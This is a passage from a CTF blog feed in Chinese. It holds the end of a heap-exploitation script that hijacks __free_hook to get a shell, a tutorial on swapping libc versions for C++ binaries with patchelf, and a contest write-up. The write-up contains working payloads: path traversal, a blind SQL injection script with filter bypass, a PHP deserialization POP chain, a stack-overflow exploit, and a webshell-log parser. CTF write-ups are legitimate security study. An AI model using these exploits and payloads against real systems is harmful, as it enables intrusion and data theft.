class="number">2</span>,<span class="number">0x18</span>,<span class="string">b&#x27;/bin/sh\0&#x27;</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x18</span>,<span class="string">b&#x27;\0&#x27;</span>*<span class="number">8</span>+p64(<span class="number">0x31</span>))</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#free(0)</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x78</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x78</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x78</span>,p64(heap_addr-<span class="number">0x10</span>))</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x78</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x78</span>,p64(<span class="number">0</span>)+p64(<span class="number">0xa1</span>))<span class="comment">#构造非fastbin大小的堆块</span></span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x38</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):<span class="comment">#填满tcache 使其落入unsorted bin</span></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x28</span>,<span class="string">b&#x27;aa&#x27;</span>)</span><br><span class="line">libc_addr=add(<span class="number">10</span>,<span class="number">0x28</span>,<span class="string">b&#x27;\0&#x27;</span>)-<span class="number">0x3ebca0</span><span class="comment">#泄露libc地址</span></span><br><span class="line">success(<span class="string">&#x27;libc_addr:&#x27;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line"></span><br><span class="line">add(<span class="number">11</span>,<span class="number">0x60</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">free(<span class="number">11</span>)</span><br><span class="line">free(<span class="number">11</span>)</span><br><span class="line">add(<span class="number">12</span>,<span class="number">0x60</span>,p64(libc_addr+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]))<span class="comment">#劫持freehook</span></span><br><span class="line">add(<span class="number">13</span>,<span class="number">0x60</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">14</span>,<span class="number">0x60</span>,p64(libc_addr+libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">add(<span class="number">15</span>,<span class="number">0x18</span>,<span class="string">b&#x27;/bin/sh\0&#x27;</span>)</span><br><span class="line">free(<span class="number">15</span>)<span class="comment">#getshell</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> pwn </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>关于C++文件换libc版本的问题</title>
      <link href="/2021/11/01/%E5%85%B3%E4%BA%8EC++%E6%96%87%E4%BB%B6%E6%8D%A2libc%E7%89%88%E6%9C%AC%E7%9A%84%E9%97%AE%E9%A2%98/"/>
      <url>/2021/11/01/%E5%85%B3%E4%BA%8EC++%E6%96%87%E4%BB%B6%E6%8D%A2libc%E7%89%88%E6%9C%AC%E7%9A%84%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<p>今天解决了一件困扰了我很久的事情，那就是对于elf文件的patch。以前我在做pwn题的时候，遇到C++文件总是束手无策。</p><span id="more"></span><p>在换过对应的版本之后，libc总是报错。就如下面这张图片</p><p><img src="/2021/11/01/%E5%85%B3%E4%BA%8EC++%E6%96%87%E4%BB%B6%E6%8D%A2libc%E7%89%88%E6%9C%AC%E7%9A%84%E9%97%AE%E9%A2%98/1.png" alt="1"></p><p>在此问了肥猫师傅给我的解决办法，解决办法很早就给了我的，但是我到现在才搞明白，弄懂,下面是肥猫师傅的原话。</p><p><img src="/2021/11/01/%E5%85%B3%E4%BA%8EC++%E6%96%87%E4%BB%B6%E6%8D%A2libc%E7%89%88%E6%9C%AC%E7%9A%84%E9%97%AE%E9%A2%98/2.png" alt="2"></p><p>在此之前我一直都是用patchelf封装的脚本加上glibc all in one配合完美换libc版本，对于C程序是没有任何问题的。但是C++出现了问题，那么我们就先看看C和C++编译链接之后出来的文件的依赖库的结构。</p><p>那么为了测试就先写出两个版本的hello world程序。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//C</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello world\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//C++</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;Hello world&quot;</span>&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分别用gcc和g++命令编译得到1和2可执行文件。</p><p>查看动态链接的关系。</p><p><img src="/2021/11/01/%E5%85%B3%E4%BA%8EC++%E6%96%87%E4%BB%B6%E6%8D%A2libc%E7%89%88%E6%9C%AC%E7%9A%84%E9%97%AE%E9%A2%98/3.png" alt="3"></p><p>可以看到C++程序多了三项依赖，查一下自己glibc all in one libs中找得到一下依赖项</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">libc.so.6</span><br><span class="line">libm.so.6</span><br><span class="line">ld.so.6</span><br></pre></td></tr></table></figure><p>我们换库的原因是因为malloc的分配以及各个函数在libc中的偏移在不同版本中都有着很大的区别，偏移问题不大，只需要在本地打出之后连接远程靶机的时候替换一下自己的libc即可。但是在打堆题的时候，不同libc分配有本质区别，比如，2.27的tcache允许直接double free，但是2.23和2.29之后都不允许直接的double free。以及2.34 的libc 中很多hook已经被删除，并不能利用。总之，在打堆题的时候版本是一个很重要的东西，不同版本利用手段都会有本质区别的。</p><p>我们patchelf的时候一般是指定链接器，然后再指定runpath到我们自己下载的库文件。那我们把这两个项换上2.23的libc之后ldd看看他们的依赖关系。</p><p><img src="/2021/11/01/%E5%85%B3%E4%BA%8EC++%E6%96%87%E4%BB%B6%E6%8D%A2libc%E7%89%88%E6%9C%AC%E7%9A%84%E9%97%AE%E9%A2%98/4.png" alt="2"></p><p>可以看到两个文件都已经换上了2.23版本的libc，但是C++编译出来的文件出现了报错，报错是在我们换上的libc.so.6中报出的，然后报错的提醒是因为这个libstdc++.so.6。那么就可以确定一点了，c++自己额外提供了库，而这个库是libstdc++.so.6，而这一项指定到了我们系统的/lib/x86_64-linux-gnu/libstdc++.so.6这个库文件中，而这个库文件是对应了我们安装的版本的，因此我们需要去找一找2.23版本的这个C++的库，并且patch之后指向那个库应该就可以解决。这里可以学肥猫师傅的做法，先用docker装一个16版本的ubuntu，因为16版本刚好对应了libc的版本2.23。</p><p>这里先去用docker拉一个ubuntu16.04的镜像然后用如下命令进入这个镜像。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#docker run -it ubuntu:16.04 /bin/bash</span><br></pre></td></tr></table></figure><p>进入之后装上g++和vim，用vim写一个hello world 并且编译之后ldd查看文件依赖关系，找到libstdc++.so.6指向的具体路径然后用docker cp命令拷贝到自己目录下，然后建议丢进libs目录，此时为C++文件再加一个patchelf命令，我这里用了如下命令，自己看情况改改路径即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$patchelf --replace-needed libstdc++.so.6 &#x27;/home/xiaoji233/pwn-tools/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libstdc++.so.6.0.21&#x27;  filename</span><br></pre></td></tr></table></figure><p>那么，改完了之后我们ldd看看情况。</p><p><img src="/2021/11/01/%E5%85%B3%E4%BA%8EC++%E6%96%87%E4%BB%B6%E6%8D%A2libc%E7%89%88%E6%9C%AC%E7%9A%84%E9%97%AE%E9%A2%98/5.png" alt="5"></p><p>可以看到libstdc++.so.6已经指向了我们所给的库，并且也没有上面两行的报错了，因此这样就完成了一个C++程序的版本更换。</p><p>最后我们运行看看。</p><p><img src="/2021/11/01/%E5%85%B3%E4%BA%8EC++%E6%96%87%E4%BB%B6%E6%8D%A2libc%E7%89%88%E6%9C%AC%E7%9A%84%E9%97%AE%E9%A2%98/6.png" alt="6"></p><p>完美成功运行。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>小总结一波：在更换C程序的时候需要用patchelf更改链接器的版本和runpath，C++程序换libc版本的时候需要额外指定一个libstdc++.so.6这个库才能正常运行。</p><p>总而言之，解决这个问题心情十分爽快，也希望本篇博客能帮到很多人。</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> pwn </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2021浙江省决赛</title>
      <link href="/2021/10/31/zjctf2021%20%E5%86%B3%E8%B5%9B/"/>
      <url>/2021/10/31/zjctf2021%20%E5%86%B3%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>本次比赛最终rank21，幸而拿到省赛一等奖最后一名。pwn题签到拿下二血，re签到拿下还是好的，但是pwn少拿了一道有点可惜。最终还是靠学长ak web才拿下的省一，希望学长明年还能带我。下面放出本次比赛提交的wp，misc和cry因为没有留下图片(就是wps复制过来的，导出pdf之后交了，后面word删了图片也就没了)。</p><span id="more"></span><h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><h4 id="远古特性"><a href="#远古特性" class="headerlink" title="远古特性"></a>远古特性</h4><p>换行绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hint/hint.txt%0a../../../../../../flag</span><br></pre></td></tr></table></figure><h4 id="just-login"><a href="#just-login" class="headerlink" title="just login"></a>just login</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &quot;http://8fd95e2e-9d91-45b1-8ba9-d41be0125b3f.zj-ctf.dasctf.com:80/login&quot;</span><br><span class="line">flag = &#x27;&#x27;</span><br><span class="line">data = &#123;&quot;username&quot;: &quot;123&#x27; oorr 1=1 -- &quot;, &quot;password&quot;: &quot;1&quot;&#125;</span><br><span class="line">res = requests.post(url, data=data)</span><br><span class="line">for i in range(1, 500):</span><br><span class="line">    low = 32</span><br><span class="line">    high = 128</span><br><span class="line">    mid = (low + high) // 2</span><br><span class="line">    while low &lt; high:</span><br><span class="line">        data[</span><br><span class="line">            &#x27;username&#x27;] = &quot;1&#x27; oorr substr((sselectelect grogroupup_coonncat(username) frfromom users),&#123;&#125;,1)&gt;&#x27;&#123;&#125;&#x27; -- &quot;.format(</span><br><span class="line">            i, chr(mid))</span><br><span class="line">        res = requests.post(url, data=data)</span><br><span class="line">        if &#x27;Failed&#x27; in res.text:</span><br><span class="line">            high = mid</span><br><span class="line">        else:</span><br><span class="line">            low = mid + 1</span><br><span class="line">        mid = (low + high) // 2</span><br><span class="line">    if mid == 32 or mid == 127:</span><br><span class="line">        break</span><br><span class="line">    flag = flag + chr(mid)</span><br><span class="line">    print(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>跑跑脚本完事</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &quot;http://8fd95e2e-9d91-45b1-8ba9-d41be0125b3f.zj-ctf.dasctf.com:80/login&quot;</span><br><span class="line">flag = &#x27;&#x27;</span><br><span class="line">data = &#123;&quot;username&quot;: &quot;123&#x27; oorr 1=1 -- &quot;, &quot;password&quot;: &quot;1&quot;&#125;</span><br><span class="line">res = requests.post(url, data=data)</span><br><span class="line">for i in range(1, 500):</span><br><span class="line">    low = 1</span><br><span class="line">    high = 128</span><br><span class="line">    mid = (low + high) // 2</span><br><span class="line">    while low &lt; high:</span><br><span class="line">        data[</span><br><span class="line">            &#x27;username&#x27;] = &quot;1&#x27; oorr substr((sselectelect grgroupoup_coonncat(sql) frfromom sqlite_maasster),&#123;&#125;,1)&gt;&#x27;&#123;&#125;&#x27; -- &quot;.format(</span><br><span class="line">            i, chr(mid))</span><br><span class="line">        res = requests.post(url, data=data)</span><br><span class="line">        if &#x27;Failed&#x27; in res.text:</span><br><span class="line">            high = mid</span><br><span class="line">        else:</span><br><span class="line">            low = mid + 1</span><br><span class="line">        mid = (low + high) // 2</span><br><span class="line">    # if mid == 32 or mid == 127:</span><br><span class="line">    #     break</span><br><span class="line">    flag = flag + chr(mid)</span><br><span class="line">    print(flag)</span><br><span class="line"></span><br><span class="line">print(&#x27;\n&#x27; + bytes.fromhex(flag).decode())</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="Safepop"><a href="#Safepop" class="headerlink" title="Safepop"></a>Safepop</h4><p>pop链是<code>Test::getFlag()&lt;- Fun:__call() &lt;- A:__get() &lt;- B:__destruct()</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Fun</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;func = <span class="keyword">array</span>(<span class="string">&quot;Test&quot;</span>, <span class="string">&quot;getFlag&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span class="keyword">new</span> Fun();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span class="keyword">new</span> A();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="string">&#x27;aaa&#x27;</span>;<span class="comment">//传给__get的参数</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *  Test::getFlag()&lt;- Fun:__call() &lt;- A:__get() &lt;- B:__destruct()</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> B();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$b</span>);</span><br></pre></td></tr></table></figure><p>然后利用PHP Bug 72663来绕过__wakeup。虽然版本是大于7.0.10，但还是可以，不知道为什么。</p><p>把payload的对象数改一下，改为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:1:&quot;B&quot;:3:&#123;s:1:&quot;p&quot;;s:3:&quot;aaa&quot;;s:1:&quot;a&quot;;O:1:&quot;A&quot;:2:&#123;s:1:&quot;a&quot;;O:3:&quot;Fun&quot;:2:&#123;s:4:&quot;func&quot;;a:2:&#123;i:0;s:4:&quot;Test&quot;;i:1;s:7:&quot;getFlag&quot;;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>打入，结束。</p><h3 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h3><h4 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h4><p>strcat 栈溢出，利用已经有的后门cat flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level=&#x27;debug&#x27;</span><br><span class="line">context.arch=&#x27;amd64&#x27;</span><br><span class="line">context.os=&#x27;linux&#x27;</span><br><span class="line">def conn(x,file_name):</span><br><span class="line">    if x:</span><br><span class="line">        p=process(file_name)</span><br><span class="line">        libc=ELF(&#x27;./libc/libc-2.23-64.so&#x27;)</span><br><span class="line">    else:</span><br><span class="line">        p=remote(&#x27;89563411-fd49-4df0-a394-13757851c159.zj-ctf.dasctf.com&#x27;,54500)</span><br><span class="line">        libc=ELF(&#x27;./libc/libc-2.23-buu64.so&#x27;)</span><br><span class="line">    return ELF(file_name),libc,p</span><br><span class="line">elf,libc,p=conn(0,&#x27;./sai_easy_pwn&#x27;)</span><br><span class="line"></span><br><span class="line">shell=0x40098e</span><br><span class="line">username=b&#x27;a&#x27;*0x30</span><br><span class="line">pwd=b&#x27;a&#x27;*24+p64(shell)</span><br><span class="line"></span><br><span class="line">p.sendafter(b&#x27;username:&#x27;,username)</span><br><span class="line">p.sendafter(b&#x27;password&#x27;,pwd)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#gdb.attach(p)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h3><h4 id="最简单的逆向"><a href="#最简单的逆向" class="headerlink" title="最简单的逆向"></a>最简单的逆向</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;bits/stdc++.h&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">unsigned char enc[] =</span><br><span class="line">&#123;</span><br><span class="line">  0x76, 0x73, 0x85, 0x75, 0x86, 0x78, 0xAD, 0x6B, 0x97, 0x68, </span><br><span class="line">  0x98, 0x67, 0x64, 0x64, 0x62, 0x97, 0x68, 0x98, 0x6B, 0x6B, </span><br><span class="line">  0x96, 0x67, 0x62, 0x69, 0x95, 0x96, 0x65, 0x96, 0x6A, 0x69, </span><br><span class="line">  0x69, 0x65, 0x66, 0x97, 0x68, 0x98, 0x6A, 0x95, 0x68, 0xAF, </span><br><span class="line">  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, </span><br><span class="line">  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, </span><br><span class="line">  0x00, 0x00, 0x00, 0x00</span><br><span class="line">&#125;;</span><br><span class="line">int main()&#123;</span><br><span class="line">    for (int i = 0; i &lt;= 39; ++i )&#123;</span><br><span class="line">        enc[i]-=50;</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    printf(&quot;%s&quot;,enc);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><h4 id="decode-and-decode"><a href="#decode-and-decode" class="headerlink" title="decode_and_decode"></a>decode_and_decode</h4><p>利用工具直接解</p><h3 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h3><h4 id="asoul-lover"><a href="#asoul-lover" class="headerlink" title="asoul_lover"></a>asoul_lover</h4><p>结合题目描述及pdf信息搜集，压缩包密码直接解</p><h4 id="site-log"><a href="#site-log" class="headerlink" title="site_log"></a>site_log</h4><p>查看log，在evil.php所有一些命令。跑脚本跑出所有。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">file = <span class="string">&#x27;my_site.log&#x27;</span></span><br><span class="line">p = <span class="string">&#x27;vil.php\?attack=(.*) HTTP/1.1&#x27;</span></span><br><span class="line">s = []</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(file, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        data = f.readline()</span><br><span class="line">        <span class="keyword">if</span> data:</span><br><span class="line">            out = re.findall(p, data)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> out:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            s.append(out[<span class="number">0</span>])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;log.txt&#x27;</span>, <span class="string">&#x27;w+&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        f.write(<span class="built_in">str</span>(i + <span class="string">&quot;\n&quot;</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后打印看看哪些有用的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="number">108</span>), <span class="built_in">chr</span>(<span class="number">115</span>)</span><br><span class="line">      , <span class="built_in">chr</span>(<span class="number">99</span>), <span class="built_in">chr</span>(<span class="number">100</span>), <span class="built_in">chr</span>(<span class="number">32</span>), <span class="built_in">chr</span>(<span class="number">47</span>)</span><br><span class="line">      , <span class="built_in">chr</span>(<span class="number">108</span>), <span class="built_in">chr</span>(<span class="number">115</span>)</span><br><span class="line">      , <span class="built_in">chr</span>(<span class="number">99</span>), <span class="built_in">chr</span>(<span class="number">97</span>), <span class="built_in">chr</span>(<span class="number">116</span>), <span class="built_in">chr</span>(<span class="number">32</span>), <span class="built_in">chr</span>(<span class="number">102</span>), <span class="built_in">chr</span>(<span class="number">108</span>), <span class="built_in">chr</span>(<span class="number">97</span>), <span class="built_in">chr</span>(<span class="number">103</span>)</span><br><span class="line">      , <span class="built_in">chr</span>(<span class="number">119</span>), <span class="built_in">chr</span>(<span class="number">104</span>), <span class="built_in">chr</span>(<span class="number">111</span>), <span class="built_in">chr</span>(<span class="number">97</span>), <span class="built_in">chr</span>(<span class="number">109</span>), <span class="built_in">chr</span>(<span class="number">105</span>)</span><br><span class="line">      , <span class="built_in">chr</span>(<span class="number">122</span>), <span class="built_in">chr</span>(<span class="number">105</span>), <span class="built_in">chr</span>(<span class="number">112</span>)</span><br><span class="line">      , <span class="built_in">chr</span>(<span class="number">122</span>), <span class="built_in">chr</span>(<span class="number">105</span>), <span class="built_in">chr</span>(<span class="number">112</span>), <span class="built_in">chr</span>(<span class="number">32</span>), <span class="built_in">chr</span>(<span class="number">45</span>), <span class="built_in">chr</span>(<span class="number">114</span>), <span class="built_in">chr</span>(<span class="number">80</span>), <span class="built_in">chr</span>(<span class="number">32</span>), <span class="built_in">chr</span>(<span class="number">104</span>), <span class="built_in">chr</span>(<span class="number">101</span>), <span class="built_in">chr</span>(<span class="number">104</span>),</span><br><span class="line">      <span class="built_in">chr</span>(<span class="number">101</span>), <span class="built_in">chr</span>(<span class="number">104</span>), <span class="built_in">chr</span>(<span class="number">101</span>), <span class="built_in">chr</span>(<span class="number">50</span>), <span class="built_in">chr</span>(<span class="number">51</span>), <span class="built_in">chr</span>(<span class="number">51</span>), <span class="built_in">chr</span>(<span class="number">95</span>), <span class="built_in">chr</span>(<span class="number">73</span>), <span class="built_in">chr</span>(<span class="number">103</span>), <span class="built_in">chr</span>(<span class="number">111</span>), <span class="built_in">chr</span>(<span class="number">116</span>), <span class="built_in">chr</span>(<span class="number">114</span>),</span><br><span class="line">      <span class="built_in">chr</span>(<span class="number">111</span>), <span class="built_in">chr</span>(<span class="number">111</span>), <span class="built_in">chr</span>(<span class="number">116</span>), <span class="built_in">chr</span>(<span class="number">65281</span>), <span class="built_in">chr</span>(<span class="number">32</span>), <span class="built_in">chr</span>(<span class="number">102</span>), <span class="built_in">chr</span>(<span class="number">108</span>), 